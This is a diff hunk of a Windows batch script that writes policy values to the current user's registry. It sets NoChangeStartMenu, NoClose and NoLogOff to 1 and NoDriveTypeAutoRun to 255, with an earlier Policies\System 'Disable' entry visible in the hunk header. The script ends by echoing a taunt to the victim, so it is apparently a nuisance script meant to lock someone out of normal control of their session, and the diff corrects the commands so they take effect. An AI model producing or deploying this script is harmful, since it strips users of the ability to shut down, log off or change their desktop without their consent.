@@ -21,16 +21,16 @@ reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Disabl
 
 REM explorer keys
 REM adds the "NoChangeStartMenu" setting
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoChangeStartMenu /t REG_DWORD /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoChangeStartMenu /t REG_DWORD /d 1 /f
 
 REM: adds the "NoClose" setting
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
 
 REM adds the "NoLogOff" setting
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogOff /t REG_DWORD /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogOff /t REG_DWORD /d 1 /f
 
 REM adds the "NoDriveTypeAutoRun" setting
-reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDriveTypeAutoRun /t REG_DWORD /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDriveTypeAutoRun /t REG_DWORD /d 255 /f
 
 REM finish
 echo fucked ur shit UPPP dawg. close this damn window.
